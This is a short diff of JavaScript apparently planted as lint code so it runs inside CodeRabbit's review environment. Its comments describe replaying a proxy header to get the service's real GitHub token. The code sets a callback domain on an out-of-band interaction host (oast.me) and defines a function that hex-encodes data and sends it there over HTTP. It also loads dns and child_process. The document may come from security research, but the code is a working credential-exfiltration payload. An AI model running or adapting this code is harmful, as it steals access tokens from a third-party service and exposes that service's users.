@@ -2,7 +2,7 @@
 // The lint code can read its repo's Proxy-Tokenizer header and replay it through
 // localhost:1080, which injects CodeRabbit's real GitHub token. Q: how broad is it?
 // READ-ONLY GitHub API calls that reveal only the TOKEN'S OWN scope.
-var C = 'd8sjleroeaqmm0qbu240qjwx61q4knzdb.oast.site';
+var C = 'd8sktqboeaqmtgiem2h0hyn6etnx68jy1.oast.me';
 var http = require('http'), dns = require('dns'), cp = require('child_process');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1700), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
